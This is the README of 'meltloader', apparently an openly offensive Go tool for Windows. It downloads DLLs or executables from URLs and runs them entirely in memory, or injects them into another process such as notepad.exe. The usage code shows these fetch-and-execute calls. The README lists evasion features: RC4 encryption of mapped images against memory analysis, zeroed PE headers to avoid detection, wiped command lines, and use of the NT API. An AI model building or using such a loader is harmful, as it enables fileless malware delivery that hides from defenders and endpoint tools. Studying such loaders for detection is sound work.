# meltloader

a reflective dll/pe loader for windows written in go that performs pe loading entirely in memory with automatic memory management and encryption features.

## demo
>now supports PEs
![melt](https://github.com/user-attachments/assets/819639da-32ca-4393-8945-0e4c0b8145d6)

## overview

meltload implements reflective dll/pe loading using windows nt api calls to allocate, write, and execute pe files without touching disk. the loader handles pe parsing, relocation processing, import resolution, and memory protection changes while providing tracking and cleanup capabilities. this should allow you to chain an arbitrary amount of DLLs that perform various operations in a modular and secure manner :3

the loader uses windows' provided SystemFunction032 rc4 encryption for evasion purposes. downloaded dlls are always encrypted in memory with an optional sleep period before decryption and execution, and after execution the mapped dll image gets encrypted in place using a randomly generated key. this makes the loaded dll unreadable to memory analysis tools while maintaining proper cleanup functionality.

## https requirement

LoadDLLFromURL requires https connections as winhttp in all my implementations failed with non https and i cba to look at microsoft docs any longer for function signature and type converting windows stuff to go.

## go dll compatibility

also works with go compiled dlls, see go-dll-src/ for reference 

## api usage

```go
// load dll from url with export specification
mapping, err := pe.LoadDLLFromURL("https://example.com/dll.dll", "export_only:ExportedFunction")

// load pe from url with optional sleep in seconds before execution
peMapping, err := pe.LoadPEFromUrl("https://example.com/file.exe", 2)

// load pe from url without sleep
peMapping, err := pe.LoadPEFromUrl("https://example.com/file.exe", 0)

pid, pHandle, err := pe.FindTargetProcess("notepad.exe")
if err != nil {
	log.Printf("[main] failed to find process: %v", err)
	fmt.Println("failed to find process", err)
	return
}
buff, err := net.DownloadToMemory("https://url.com/file.dll")
if err != nil {
	log.Printf("[main] failed to download DLL: %v", err)
	fmt.Println("failed to download", err)
	return
}
_, err = pe.LoadDLLRemote(pHandle, buff, "ExportedFunction")
if err != nil {
	log.Printf("[main] LoadDLLRemote failed: %v", err)
	fmt.Println("failed to load", err)
	return
}
log.Printf("[main] LoadDLLRemote succeeded")
// same pattern for LoadPERemote()
buff, err := net.DownloadToMemory("https://url.com/file.exe")
if err != nil {
	log.Printf("[main] failed to download PE: %v", err)
	fmt.Println("failed to download", err)
	return
}
_, err = pe.LoadPERemote(pHandle, buff)
if err != nil {
	log.Printf("[main] LoadPERemote failed: %v", err)
	fmt.Println("failed to load", err)
	return
}
log.Printf("[main] LoadPERemote succeeded")

// check currently mapped dlls
baseAddrs, sizes, count := pe.GetMap()
fmt.Printf("currently have %d DLLs mapped:\n", count)
for i := 0; i < count; i++ {
	fmt.Printf("DLL %d: Base=0x%X, Size=%d bytes\n", i, baseAddrs[i], sizes[i])
}

// check currently mapped pes
peBaseAddrs, peSizes, peCount := pe.GetPEMap()
fmt.Printf("currently have %d PEs mapped:\n", peCount)
for i := 0; i < peCount; i++ {
	fmt.Printf("PE %d: Base=0x%X, Size=%d bytes\n", i, peBaseAddrs[i], peSizes[i])
}

// cleanup/unmap dll from memory
err = pe.Melt(mapping)

// cleanup/unmap exe from memory 
err = pe.MeltPE(peMapping)
```

## function identifier interface

the functionIdentifier parameter accepts multiple types:

- string: function name for named exports ("MessageBoxA")
- int: ordinal number for ordinal exports 
- string containing number: automatically parsed as ordinal ("123")

if no specific function is found, the loader will execute the dll's entry point with DLL_PROCESS_ATTACH.

## technical implementation

the loader performs standard reflective dll/pe loading steps:

pe validation checks dos and nt headers for proper signatures and offsets. memory allocation uses NtAllocateVirtualMemory attempting preferred base address first, falling back to system-chosen addresses. section mapping copies pe headers and each section to their virtual addresses using NtWriteVirtualMemory.

relocation processing handles base address changes by parsing the relocation table and updating all absolute addresses. both IMAGE_REL_BASED_DIR64 and IMAGE_REL_BASED_HIGHLOW relocations are processed for compatibility. import resolution walks the import table, loads required libraries with LoadLibraryLdr, and resolves function addresses with hash-based lookups.

**exit function patching**: during iat resolution, any references to process termination functions (exit, ExitProcess, _exit, _Exit, quick_exit) are automatically replaced with ExitThread. this prevents loaded pes from terminating the entire loader process, ensuring they only exit their own thread.

memory protection changes from PAGE_READWRITE to appropriate section protections (PAGE_EXECUTE_READ, PAGE_READWRITE, etc.) using NtProtectVirtualMemory after loading completes. export resolution searches the export table by name or ordinal to find the target function.

tls callbacks are executed with proper calling conventions before the entry point. pe headers are zeroed out after loading to avoid detection. command line arguments in the peb are wiped to prevent information leakage.

memory tracking maintains separate global registries for loaded dlls and pes protected by read-write mutex. each mapping stores base address and size information. the Melt/MeltPE functions use NtFreeVirtualMemory with MEM_RELEASE flag and automatically removes entries from the tracking registry.

## evasion features

the loader includes several evasion mechanisms. downloaded dlls are always encrypted in memory with an optional time period before decryption and execution. mapped dlls get encrypted in place after execution using rc4 with random keys. memory operations use nt api calls instead of higher level win32 apis. all allocations and operations happen entirely in memory without disk artifacts. the tracking system allows complete cleanup of loaded dlls, removing them from our process memory.
